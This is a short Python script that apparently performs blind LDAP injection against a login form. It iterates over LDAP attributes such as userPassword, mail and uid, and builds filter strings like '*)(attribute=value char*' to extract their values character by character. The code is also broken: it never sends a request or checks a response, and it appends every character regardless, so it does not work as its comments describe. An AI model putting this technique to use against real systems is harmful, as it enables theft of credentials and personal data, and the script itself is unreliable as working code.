import string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]

for attribute in attributes: #Extract all attributes
    value = ""
    finish = False
    while not finish:
        for char in alphabet: #In each possition test each possible printable char
            query = f"*)({attribute}={value}{char}*"
            data = {'login':query, 'password':'bla'}
            print(f"\r{attribute}: {value}{char}")
            value += str(char)
            if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
                finish = True
                print()